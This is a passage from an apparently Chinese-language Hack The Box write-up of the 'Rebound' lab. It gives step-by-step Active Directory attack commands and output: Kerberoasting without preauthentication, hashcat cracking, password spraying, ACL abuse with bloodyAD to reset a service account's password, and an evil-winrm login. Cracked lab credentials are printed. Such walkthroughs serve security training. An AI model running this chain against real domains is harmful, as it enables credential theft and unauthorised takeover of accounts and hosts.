<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo hashcat -m 18200 <span class="string">&#x27;$krb5asrep$23$jjones@REBOUND.HTB:4d4b23e6080644cba535559a570eec9c$03a8ee4eb3373b908413c80b80f7829f9ce0229ea9891fda70d8e3759d3bbbaee6c252101aa5698cfb400b13158781d9b2e0723e001415751ccea4b247bd32dbfcf610a1245c19ed27920fdd5ad1fc00fd521633527ddf5e153039584f96449b088b860a00b7d7cf61985d6bbc9b6a3e30f130ccf0716bbb635d01fcdf44e1e91a7ed9000fd59d775e55d104eb083dd125c3190ce0757a8ac2638f072df7472455e453874c8a1209288bd8915503fd10d2dc932fe6476606dba5f347d9fd3cd902090c672a0808d5f6610d062298ac50c07581af14d06c20290d1d8181d891245beef1ab182a027146c5&#x27;</span> /usr/share/wordlists/rockyou.txt  </span><br></pre></td></tr></table></figure>
<p>没有成功破解，尝试添加密码规则扩充密钥空间</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo hashcat -m 18200 <span class="string">&#x27;$krb5asrep$23$jjones@REBOUND.HTB:4d4b23e6080644cba535559a570eec9c$03a8ee4eb3373b908413c80b80f7829f9ce0229ea9891fda70d8e3759d3bbbaee6c252101aa5698cfb400b13158781d9b2e0723e001415751ccea4b247bd32dbfcf610a1245c19ed27920fdd5ad1fc00fd521633527ddf5e153039584f96449b088b860a00b7d7cf61985d6bbc9b6a3e30f130ccf0716bbb635d01fcdf44e1e91a7ed9000fd59d775e55d104eb083dd125c3190ce0757a8ac2638f072df7472455e453874c8a1209288bd8915503fd10d2dc932fe6476606dba5f347d9fd3cd902090c672a0808d5f6610d062298ac50c07581af14d06c20290d1d8181d891245beef1ab182a027146c5&#x27;</span> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/InsidePro-PasswordsPro.rule --potfile-disable</span><br></pre></td></tr></table></figure>
<p>仍不成功，放弃asrep-roasting</p>
<h2 id="Kerberos-Roasting"><a href="#Kerberos-Roasting" class="headerlink" title="Kerberos-Roasting"></a>Kerberos-Roasting</h2><p><a target="_blank" rel="noopener" href="https://www.semperis.com/blog/new-attack-paths-as-requested-sts/">研究</a>表明，可以利用AS-REP-roastable用户来执行Kerberoasting，无需预认证</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">However, for Kerberoasting, access to the session key is not required. Only the resulting ST—or more accurately, the encrypted part of the ST, which is not secured with the requesting accounts key—is required. Therefore, if any account is configured to not require pre-authentication, it is possible to Kerberoast without any credentials. This method of Kerberoasting has been implemented in Rubeus within this PR.</span><br></pre></td></tr></table></figure>
<p>利用jjones这个不需要进行身份预验证的账户进行新型Kerberos-Roasting攻击，攻击处在KRB_TGS_REP这个过程，我们可以拿到利用此服务账号的NTLM HASH加密过的TGS</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo impacket-GetUserSPNs -no-preauth jjones -usersfile <span class="built_in">users</span> -dc-host dc01.rebound.htb rebound.htb/</span><br><span class="line">//官方给出的实际上效果是一样的</span><br><span class="line">GetUserSPNs.py -no-preauth jjones -request -usersfile ../usernames.txt rebound.htb/ -dc-ip 10.10.11.231</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>impacket-GetUserSPNs</code>：用于获取域中指定用户的 <strong>Service Principal Names (SPNs)</strong>。SPNs 是 Kerberos 认证过程中的关键元素，它们标识了与特定服务相关的账户。</p>
<p><code>-no-preauth</code>：表示禁用 <strong>预身份验证</strong>（Pre-Authentication）检查。在正常的 Kerberos 认证过程中，预身份验证是一个安全措施，用于确保请求的有效性。如果目标账户禁用了预身份验证（即帐户允许“无预身份验证”登录），那么使用此选项可以绕过此检查，从而直接请求 SPN。</p>
</blockquote>
<p>结果如下</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies </span><br><span class="line"></span><br><span class="line">[-] Principal: Administrator - Kerberos SessionError: KDC<span class="emphasis">_ERR_</span>S<span class="emphasis">_PRINCIPAL_</span>UNKNOWN(Server not found in Kerberos database)</span><br><span class="line">[-] Principal: Guest - Kerberos SessionError: KDC<span class="emphasis">_ERR_</span>S<span class="emphasis">_PRINCIPAL_</span>UNKNOWN(Server not found in Kerberos database)</span><br><span class="line">$krb5tgs$18$krbtgt$REBOUND.HTB$<span class="emphasis">*krbtgt*</span>$37e8dbc82b39558ec74c37d7$dccebf66d1c8bc563e74079954c881675dffac58038f4d932d6ea98855d2b543a6e3073119e6b754e3e433144d7d2fb27c5744b2cb3923f8a42e1737a88cda75001d5035b2888f0a960c919fc299e5f4828cefacf4534a5f8ba02ad7340fd2a9e756a4913767ff39e0590bf3e7353a5f4bf6605dbe0043658df11c94b92535cf94f4ff43bf5713bd348805c9f7acbcce9e51cdac252517fd27aad06533e7b2bbf94d9ab4005c0df4050f3e6e03ab216c6b778146d82049f1be4a0a16722ba78a1d70e09fac24abfd3d744a1300323de5b0488712df2dbfcbad6e60e99ff0fc19052d1aad89fa4c5dbadea51b1ef6d6709f2bd8aac694160c55b68e14d65c6440ab93d4e40884527236c3e8cdedcb3a307a1d2a643f508957271d2e72faff3c90b1abe66f769b1d7ac74defcc09ca1a533ad444fad681cb27b349cf60bbe2971f79c31e26c606e241ec8c5383f06e0316e9f7578b82670bf131da9f7ca701c8f6cba7c57b7af90fe1621b5ad791fd8c2c73d976a079419424708bca443c47bca1f72976d2df34ecafb6ba02d31bcf7e6a0edb127e814e13472460e220b0ed617ae21325014ad2be6cb9dfd254b471bcba735839943b7b37979352116cbee85aa95c23836f41a18b21170801824019caf01f4efe3d1bcd020d8931b025948cda971b01202b14dfa1c7b7bef2dace68fb8ce7d2b12772a75a11d8ee988b526ab7e2204ef11bedbb43a866fc6c893d35275232681b95309d17494ab80b190364639f7dcaca8a3f25a6e7787e2fc20e38ed0030321b0bf8de2389e57845276930b2569a42e4d60c74f600d104164de6385bf149eb91fdd15f59cc6c1d0f903807a7316e530c29fd8c736c9cb41976d0e93b948bf0b02fc5beb447874aed20efedb6a8ee28408ff035102a3fa99ada1ee66458e40114af337dcb05b9d0708c8af2c4d36844769fe43feec753aaefe098305210c876005110b3d401ceb1f423d7b7edd2d4d1d5dcbe92e47fda08519541ed7bd3da12d0739bfb01b38063a570b91ba9865e77a159b30a3d5c07ff99683faf26f7bf0fb9877a1960abe582f0c1cb0dad5355f7517e34d700b2b244ff40ae734677977006cccae7d0d997cf17422fdff6508dee9c62e4e49ea557ea474d5c06cbd82fc8d12288a418968e43ffc345aad343fbcfcbb4eee7c6cca80e518ded1f252d75e8e7e131b77fa4b8c7dfab9f0ae9d625164a23a574ee3da0032ae9dc82dfc5eef764e94fcb3f84b78f991eb5a1d981841ed1483e2b8b4bef65378d95df974d3bddd9d5e604df1817cea13c811e973f270560791340dfd3388d2ae2af2feb605913d23fc19ba98f68fd0fa336183449803e6321cc6d9394e7666fd40a49edd136f0b99555b5d1802186b0bcc3bdfc89468a11288e64604431e92a6ef7ef73fe0ed271dc0960f9ed705f2b6d648ea77b0eb94a6e4c6d2910072632ed6ce06072e050</span><br><span class="line">[-] Principal: ppaul - Kerberos SessionError: KDC<span class="emphasis">_ERR_</span>S<span class="emphasis">_PRINCIPAL_</span>UNKNOWN(Server not found in Kerberos database)</span><br><span class="line">[-] Principal: llune - Kerberos SessionError: KDC<span class="emphasis">_ERR_</span>S<span class="emphasis">_PRINCIPAL_</span>UNKNOWN(Server not found in Kerberos database)</span><br><span class="line">[-] Principal: fflock - Kerberos SessionError: KDC<span class="emphasis">_ERR_</span>S<span class="emphasis">_PRINCIPAL_</span>UNKNOWN(Server not found in Kerberos database)</span><br><span class="line">[-] Principal: jjones - Kerberos SessionError: KDC<span class="emphasis">_ERR_</span>S<span class="emphasis">_PRINCIPAL_</span>UNKNOWN(Server not found in Kerberos database)</span><br><span class="line">[-] Principal: mmalone - Kerberos SessionError: KDC<span class="emphasis">_ERR_</span>S<span class="emphasis">_PRINCIPAL_</span>UNKNOWN(Server not found in Kerberos database)</span><br><span class="line">[-] Principal: nnoon - Kerberos SessionError: KDC<span class="emphasis">_ERR_</span>S<span class="emphasis">_PRINCIPAL_</span>UNKNOWN(Server not found in Kerberos database)</span><br><span class="line">$krb5tgs$23$<span class="emphasis">*ldap_monitor$REBOUND.HTB$ldap_monitor*</span>$d0cabacff008f619cfda389fbbb87661$76d52cc9820f937845bf809c8d08d6e207b3454422a014a224ab5ba0505c6f5e328062a52e92f112589097b2fb36a437d712058a127ac4ad536acc07a2ed1c3da678bf4cb99910299650e2be8a4385ee13d94c8c802fe60a1d8de0b422d881dc70f0e1912321701d91e4a08d1d49dd151b41352ddefff5a65343e11c78bda3d1b9235cefac05fc8769cdcd1f4729a0c3d19ed60a624481d9ed636c13d45baf2964c97d933eb7743e4159f14a70e4d85015184a5bd22e9a9016e81b88df9ec1f2c7a11dab9290af97c8b9b2c924951e9e76059757dcc81003aa9a8bb304014a30f94bbd6cfa9338af78ceb6c618aed856355e0af67d9aab65b223d9ba4b8271054cd20193be4074000230102ea644e51d4f458b441a0ab1068be7fd6d4ab3762e044a798eb2c5d942410089d2507ba9d46995ce0753712b8734bde612d75f8846f6cb47057d397ad381920a4211bfe4b0a1cc42ee03eff0e3946430d29f16b9cc56569d24e7d1f11df20980778786f576196596225d5288167317150265e3fad71e7660d0142cc19f2225cedb64ee5bd03698df39955876a53a3eb2b3a16a8964b4b97cbf1ca6a1a39e3fa09d3cebe2a9bc7e41558017c7223910dfe9581ccdfdc2f4bc6f4a849459a8a214fca4b1737d352c43a39e049c0d8ebc42449cd9b542d03be6d5082581019cf1e0da2c4a2e465f45a99888b492ee71fee82cb9355bc4682e906304fdf4925afbe60233f33d1d570e5dfec08824a559f07db09085ccac08e57dc6146f14aa84eafb005e3c0de493699c81f94b7efa0926275f8b32d80cc96e4aa08310d89e1f5c8f3920bd1d968b0c8b39965a927e792f99d4e1b9f9a72e5eec2ee5e8d7fc240fc54d2874fe7c79d561849dc33dd8e246653acc2442c695fc3209b9c8270ea72b61627b6d5de4c1c4664f50bb60369bd944d993075914d396ce05ace9af55316662720acbcab2797b7e778c53d631d4942c63a9e3aa35ae7964a27d1adaca673c3ba561bec09689d8af075c3ec961d51d9698cf89f77a8eeff3c704bf00981142c48937ef4c939715bc27803d98274de4dc44bc062dfe6581cc77dd4afbd19854ce1b3f7dff0491db396076268170b0c0f9385ff486a9cf8accf97e171474dd1843d60b6042bf80756f8dd549008f21f263d1b8639d34a254a49454396e98461a499beb0faa28655a68a92bc02852f50f20045a5138b6cf6eb7348d601494f380ba568a64b5a1c4015c60bf6607265e032302f0b2e49d94111fc9b00fc624c3d4621e651acc8a6fd0a467a34ef27dd5e2f751b07c93265800a3fb010bae89ebb641fcd5b4736e0563cd3be2399bca4b7ea48ac7e5cb9de664</span><br><span class="line">[-] Principal: oorend - Kerberos SessionError: KDC<span class="emphasis">_ERR_</span>S<span class="emphasis">_PRINCIPAL_</span>UNKNOWN(Server not found in Kerberos database)</span><br><span class="line">[-] Principal: winrm<span class="emphasis">_svc - Kerberos SessionError: KDC_</span>ERR<span class="emphasis">_S_</span>PRINCIPAL<span class="emphasis">_UNKNOWN(Server not found in Kerberos database)</span></span><br><span class="line"><span class="emphasis">[-] Principal: batch_</span>runner - Kerberos SessionError: KDC<span class="emphasis">_ERR_</span>S<span class="emphasis">_PRINCIPAL_</span>UNKNOWN(Server not found in Kerberos database)</span><br><span class="line">[-] Principal: tbrady - Kerberos SessionError: KDC<span class="emphasis">_ERR_</span>S<span class="emphasis">_PRINCIPAL_</span>UNKNOWN(Server not found in Kerberos database)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>相比于krbtgt账户，我们破解ldap_monitor账户的可能性要大得多，我们从这个账户入手，选择TGS-REP模式</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo hashcat -m 13100 <span class="string">&#x27;$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$d0cabacff008f619cfda389fbbb87661$76d52cc9820f937845bf809c8d08d6e207b3454422a014a224ab5ba0505c6f5e328062a52e92f112589097b2fb36a437d712058a127ac4ad536acc07a2ed1c3da678bf4cb99910299650e2be8a4385ee13d94c8c802fe60a1d8de0b422d881dc70f0e1912321701d91e4a08d1d49dd151b41352ddefff5a65343e11c78bda3d1b9235cefac05fc8769cdcd1f4729a0c3d19ed60a624481d9ed636c13d45baf2964c97d933eb7743e4159f14a70e4d85015184a5bd22e9a9016e81b88df9ec1f2c7a11dab9290af97c8b9b2c924951e9e76059757dcc81003aa9a8bb304014a30f94bbd6cfa9338af78ceb6c618aed856355e0af67d9aab65b223d9ba4b8271054cd20193be4074000230102ea644e51d4f458b441a0ab1068be7fd6d4ab3762e044a798eb2c5d942410089d2507ba9d46995ce0753712b8734bde612d75f8846f6cb47057d397ad381920a4211bfe4b0a1cc42ee03eff0e3946430d29f16b9cc56569d24e7d1f11df20980778786f576196596225d5288167317150265e3fad71e7660d0142cc19f2225cedb64ee5bd03698df39955876a53a3eb2b3a16a8964b4b97cbf1ca6a1a39e3fa09d3cebe2a9bc7e41558017c7223910dfe9581ccdfdc2f4bc6f4a849459a8a214fca4b1737d352c43a39e049c0d8ebc42449cd9b542d03be6d5082581019cf1e0da2c4a2e465f45a99888b492ee71fee82cb9355bc4682e906304fdf4925afbe60233f33d1d570e5dfec08824a559f07db09085ccac08e57dc6146f14aa84eafb005e3c0de493699c81f94b7efa0926275f8b32d80cc96e4aa08310d89e1f5c8f3920bd1d968b0c8b39965a927e792f99d4e1b9f9a72e5eec2ee5e8d7fc240fc54d2874fe7c79d561849dc33dd8e246653acc2442c695fc3209b9c8270ea72b61627b6d5de4c1c4664f50bb60369bd944d993075914d396ce05ace9af55316662720acbcab2797b7e778c53d631d4942c63a9e3aa35ae7964a27d1adaca673c3ba561bec09689d8af075c3ec961d51d9698cf89f77a8eeff3c704bf00981142c48937ef4c939715bc27803d98274de4dc44bc062dfe6581cc77dd4afbd19854ce1b3f7dff0491db396076268170b0c0f9385ff486a9cf8accf97e171474dd1843d60b6042bf80756f8dd549008f21f263d1b8639d34a254a49454396e98461a499beb0faa28655a68a92bc02852f50f20045a5138b6cf6eb7348d601494f380ba568a64b5a1c4015c60bf6607265e032302f0b2e49d94111fc9b00fc624c3d4621e651acc8a6fd0a467a34ef27dd5e2f751b07c93265800a3fb010bae89ebb641fcd5b4736e0563cd3be2399bca4b7ea48ac7e5cb9de664&#x27;</span> /usr/share/wordlists/rocknew/rockyou.txt  --potfile-disable -O -w 3</span><br></pre></td></tr></table></figure>
<p>可以发现破解成功</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250218212235.png" alt="微信截图_20250218212235"></p>
<p>我们测试一下我们的凭据<strong>ldap_monitor:1GR8t@$$4u</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nxc smb rebound.htb -u ldap_monitor -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span> </span><br></pre></td></tr></table></figure>
<p>smb可以正常登录</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250218212634.png" alt="微信截图_20250218212634"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nxc winrm rebound.htb -u ldap_monitor -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span></span><br></pre></td></tr></table></figure>
<p>winrm协议登录失败</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250218212836.png" alt="微信截图_20250218212836"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nxc ldap rebound.htb -u ldap_monitor -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250218212954.png" alt="微信截图_20250218212954"></p>
<p>这里出现了一条提示<code>LDAPS channel binding might be enabled, this is only supported with kerberos authentication. Try using &#39;-k&#39;.</code></p>
<p>表明<strong>LDAPS（LDAP over SSL）通道绑定可能已启用，而通道绑定仅支持 Kerberos 认证。因此，尝试使用 <code>-k</code> 选项来启用 Kerberos 认证。</strong></p>
<p>我们加上<code>-k</code>参数重新验证</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nxc ldap rebound.htb -u ldap_monitor -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span> -k</span><br></pre></td></tr></table></figure>
<p>出现了下面的问题<code>KRB_AP_ERR_SKEW</code></p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250218214921.png" alt="微信截图_20250218214921"></p>
<p>这表示<strong>客户端和服务器的时间不同步</strong>，导致 Kerberos 无法正确验证票据，这里因为使用<code>ntpdate</code>同步时间会导致我的HTB VPN挂掉，所以这里使用<code>faketime</code>这个工具进行时间伪造，我使用<code>ntpdate</code>查看与域控相隔的时间</p>
<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2025-02-20 02:11:08.970646 (+0800) +24170.331702 +/- 0.248765 rebound.htb 10.10.11.231 s1 no-leap</span><br><span class="line">CLOCK: time stepped by 24170.331702</span><br></pre></td></tr></table></figure>
<p>换算一下也就是</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250219193251.png" alt="微信截图_20250219193251"></p>
<p>利用工具将本地时间向前调快6小时42 分钟（调慢是ago）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime <span class="string">&#x27;6 hours 42 minutes&#x27;</span> nxc ldap rebound.htb -u ldap_monitor -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span> -k</span><br></pre></td></tr></table></figure>
<p>认证上了，森哥牛逼，哭了</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250219193627.png" alt="微信截图_20250219193627"></p>
<h2 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h2><p>考虑到ldap_monitor这个服务账号的管理者可能复用密码在普通的用户账号上，我们对我们已经获得的账户名进行密码喷洒</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nxc smb rebound.htb -u <span class="built_in">users</span> -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span> -d rebound.htb --continue-on-success</span><br></pre></td></tr></table></figure>
<p>观察结果发现存在一个用户账号使用了相同的密码，现在我们拥有了两组凭据</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250219194542.png" alt="微信截图_20250219194542"></p>
<p>对<code>oorend</code>这个账户的权限进行验证</p>
<p>smb正常</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220161231.png" alt="微信截图_20250220161231"></p>
<p>winrm仍然没有权限</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220161338.png" alt="微信截图_20250220161338"></p>
<p>ldap正常</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220161449.png" alt="微信截图_20250220161449"></p>
<h2 id="尝试获取立足点"><a href="#尝试获取立足点" class="headerlink" title="尝试获取立足点"></a>尝试获取立足点</h2><p>利用smb协议</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo impacket-smbexec rebound.htb\oorend:<span class="string">&#x27;1GR8t@$$4u&#x27;</span>@rebound.htb -dc-ip rebound.htb</span><br></pre></td></tr></table></figure>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220161936.png" alt="微信截图_20250220161936"></p>
<p>如上图均无权限</p>
<h2 id="手工枚举"><a href="#手工枚举" class="headerlink" title="手工枚举"></a>手工枚举</h2><p>我们利用powerview.py进行手工枚举，首先连接到靶机的ldap</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">faketime <span class="string">&#x27;402 minutes&#x27;</span> powerview rebound.htb/ldap_monitor:<span class="string">&#x27;1GR8t@$$4u&#x27;</span>@10.10.11.231 -k</span><br></pre></td></tr></table></figure>
<p>查看一下两个用户的信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -Identity ldap_monitor</span><br><span class="line"></span><br><span class="line">ldap_monitor Sid S-1-5-21-4078382237-1492182817-2568127209-7681</span><br><span class="line">oorend Sid S-1-5-21-4078382237-1492182817-2568127209-7682</span><br></pre></td></tr></table></figure>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220165641.png" alt="微信截图_20250220165641"></p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220165739.png" alt="微信截图_20250220165739"></p>
<p>利用Sid枚举AD对象的访问控制列表（ACL）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainObjectAcl -SecurityIdentifier S-1-5-21-4078382237-1492182817-2568127209-7682</span><br></pre></td></tr></table></figure>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220170657.png" alt="微信截图_20250220170657"></p>
<p>我们关注一下oorend的权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb</span><br><span class="line">ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683</span><br><span class="line">ACEType                     : ACCESS_ALLOWED_ACE</span><br><span class="line">ACEFlags                    : None</span><br><span class="line">ActiveDirectoryRights       : Self</span><br><span class="line">AccessMask                  : Self</span><br><span class="line">InheritanceType             : None</span><br><span class="line">SecurityIdentifier          : REBOUND\oorend</span><br></pre></td></tr></table></figure>
<p>我们观察到<code>oorend</code>用户允许对<code>ServiceMgmt</code>这个组进行特定的操作，<code>AccessMask</code>和<code>ActiveDirectoryRights</code>均为<code>Self</code>，表示该权限条目允许对象自己对自己进行某些操作，那么我们考虑将其自身加入到<code>ServiceMgmt</code>这个看起来像一个低层级的管理组中</p>
<blockquote>
<p><code>AccessMask</code>权限分类</p>
<ul>
<li><code>0x0001</code>：读取权限。</li>
<li><code>0x0002</code>：写入权限。</li>
<li><code>0x0004</code>：执行权限。</li>
</ul>
</blockquote>
<p>继续延展攻击链条，枚举系统OU</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainOU  </span><br></pre></td></tr></table></figure>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220174212.png" alt="微信截图_20250220174212"></p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220174229.png" alt="微信截图_20250220174229"></p>
<p>可以观察到只有两个OU，其中一个为<code>Service Users</code>，紧接着我们上面的攻击链开始，如果为<code>oorend</code>写入对<code>ServiceMgmt</code>的<code>GenericAll</code>权限，我们就能获得对<code>Service Users</code>的控制权</p>
<p>我们继续往下推进，我们看一下<code>ServiceMgmt</code>是否属于<code>Service Users</code>组中，我们查看<code>Service Users</code>的ACL</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainObjectAcl -Identity <span class="string">&quot;OU=Service Users,DC=rebound,DC=htb&quot;</span></span><br></pre></td></tr></table></figure>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220175638.png" alt="微信截图_20250220175638"></p>
<p>上图和我们的预期一致，<code>ServiceMgmt</code> 组在 <code>rebound.htb</code> 域中对 <strong>OU=Service Users</strong> 这个组织单位有 <strong>完全控制（FullControl）</strong> 权限</p>
<p>现在拿到了OU的权限，接下来延伸OU向外的权限</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainObject -SearchBase <span class="string">&quot;OU=Service Users,DC=rebound,DC=htb&quot;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>我们指定搜索的起点从<code>&quot;OU=Service Users,DC=rebound,DC=htb&quot;</code>开始</p>
<p>查询<code>Service Users</code> 组织单位（OU）下的所有对象（如用户、计算机、组等）。</p>
<p>返回该 OU 内所有对象的详细信息，如：</p>
<ul>
<li>Distinguished Name (DN)</li>
<li>Object Class (对象类别，如 User、Group)</li>
<li>Security Identifier (SID)</li>
<li>访问权限（ACL）</li>
<li>组成员关系等</li>
</ul>
</blockquote>
<p>里面存在两个账户的名称，<code>batch_runner</code>和<code>winrm_svc</code>，这里不关注批处理这个账户，关注这个可能给我们带来winrm远程访问权限的账户</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220180912.png" alt="微信截图_20250220180912"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainGroup -MemberIdentity <span class="string">&quot;winrm_svc&quot;</span></span><br></pre></td></tr></table></figure>
<p>确认在<code>Service Users</code>OU下</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220181046.png" alt="微信截图_20250220181046"></p>
<p>完整的攻击链条已经构建完成了，我们拥有了对<code>Service Users</code>的完全控制，并且<code>Service Users</code>包含<code>winrm_svc</code>账户，我们强制对<code>winrm_svc</code>用户密码进行修改就能获得对远程主机的winrm访问权限</p>
<h2 id="bloodhound-python-自动化枚举"><a href="#bloodhound-python-自动化枚举" class="headerlink" title="bloodhound-python 自动化枚举"></a>bloodhound-python 自动化枚举</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -d rebound.htb -c all -u oorend -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span> -ns 10.10.11.231 --zip -k</span><br></pre></td></tr></table></figure>
<h2 id="获取winrm远程访问权限"><a href="#获取winrm远程访问权限" class="headerlink" title="获取winrm远程访问权限"></a>获取winrm远程访问权限</h2><p>获取<code>ServiceMgmt</code>组成员</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainGroupMember -Identity ServiceMgmt</span><br></pre></td></tr></table></figure>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220181630.png" alt="微信截图_20250220181630"></p>
<p>增加<code>oorend</code>为<code>ServiceMgmt</code>组成员，此时注意登录的凭据为<code>oorend</code>的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Add-DomainGroupMember -Identity ServiceMgmt -Members oorend</span><br></pre></td></tr></table></figure>
<p>进行前后组成员对比</p>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220194132.png" alt="微信截图_20250220194132"></p>
<p>利用bloodyAD为<code>Service Users</code>添加<code>GenericAll</code>权限，注意操作要迅速，因为<code>oorend</code>账户会从<code>ServiceMgmt</code>账户中掉出来</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host 10.10.11.231 -u oorend -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span> add genericAll <span class="string">&quot; OU=Service Users,DC=rebound,DC=htb&quot;</span> oorend</span><br></pre></td></tr></table></figure>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220213041.png" alt="微信截图_20250220213041"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodyAD --host 10.10.11.231 -u oorend -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span> <span class="built_in">set</span> password winrm_svc Chromos2me    </span><br></pre></td></tr></table></figure>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220213651.png" alt="微信截图_20250220213651"></p>
<p>利用evil-winrm进行登录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo evil-winrm -i rebound.htb -u winrm_svc -p Chromos2me  </span><br></pre></td></tr></table></figure>
<p><img src="/2025/03/02/HTB-Rebound/微信截图_20250220213849.png" alt="微信截图_20250220213849"></p>
<p>接下来获得user.txt即可</p>
